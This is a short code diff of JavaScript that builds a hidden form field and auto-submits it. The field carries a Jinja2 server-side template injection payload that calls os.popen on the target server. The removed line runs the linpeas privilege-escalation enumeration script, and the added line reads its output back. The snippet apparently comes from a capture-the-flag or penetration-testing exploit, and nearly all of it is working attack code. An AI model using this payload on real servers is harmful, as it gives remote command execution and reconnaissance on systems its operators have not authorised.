@@ -14,7 +14,7 @@
       const i = document.createElement('input');
       i.type = 'hidden';
       i.name = 'comment';
-      i.value = `{{request.application.__globals__.__builtins__.__import__('os').popen('sh linpeas.sh > linpeas.txt').read()}}`;
+      i.value = `{{request.application.__globals__.__builtins__.__import__('os').popen('cat linpeas.txt').read()}}`;
       f.appendChild(i);
       document.body.appendChild(f);
       f.submit();
